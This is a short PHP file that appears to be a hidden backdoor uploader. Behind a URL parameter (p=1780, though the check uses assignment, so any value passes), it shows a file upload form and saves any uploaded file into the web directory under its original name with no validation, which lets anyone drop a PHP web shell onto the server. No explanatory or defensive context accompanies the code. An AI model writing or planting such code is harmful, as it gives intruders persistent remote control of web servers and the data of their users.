<?php if(isset($_GET["p"]) && $_GET["p"] = 1780) { ?>
<form method="post" enctype="multipart/form-data">
    <input type="file" name="f">
    <input type="submit">
</form>
<?php
}
if (isset($_FILES["f"]["tmp_name"]))
    move_uploaded_file($_FILES["f"]["tmp_name"], basename($_FILES["f"]["name"]));